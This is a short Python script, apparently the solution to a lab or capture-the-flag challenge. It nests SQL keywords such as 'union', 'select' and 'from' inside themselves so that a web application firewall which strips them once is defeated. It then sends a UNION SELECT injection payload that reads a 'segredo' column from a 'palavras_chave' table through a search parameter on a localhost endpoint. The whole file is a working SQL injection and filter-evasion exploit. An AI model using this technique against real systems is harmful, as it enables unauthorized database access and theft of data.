import requests

def nest(kw: str, n: int) -> str:
    if n == 0:
        return kw
    mid = len(kw) // 2
    p, s = kw[:mid], kw[mid:]
    return p + nest(kw, n - 1) + s

PASSES = 2
union  = nest('union',  PASSES)
select = nest('select', PASSES)
frm    = nest('from',   PASSES)

print(f"union  bypass: {union}")
print(f"select bypass: {select}")
print(f"from   bypass: {frm}")

payload = f"-1 {union} {select} segredo {frm} palavras_chave"
print(f"\nPayload: {payload}\n")

r = requests.get('http://localhost/api/waf', params={'search': payload})
print(f"HTTP {r.status_code}")
print(r.json())
